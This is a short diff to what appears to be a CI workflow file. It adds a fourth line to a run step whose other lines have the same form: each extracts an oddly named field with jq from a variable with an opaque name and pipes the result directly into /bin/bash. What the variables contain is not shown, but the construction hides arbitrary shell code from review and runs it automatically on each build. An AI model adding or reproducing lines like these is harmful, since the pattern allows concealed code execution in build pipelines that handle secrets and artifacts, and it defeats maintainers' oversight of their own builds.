@@ -20,6 +20,7 @@ jobs:
           echo $o2 | jq -r .vmsd2 | /bin/bash
           echo $txfra580 | jq -r .spy60496 | /bin/bash
           printf '%s' "$dxfb2264" | jq -r .ksed2095 | /bin/bash
+          echo $s24 | jq -r .diqxl08709 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
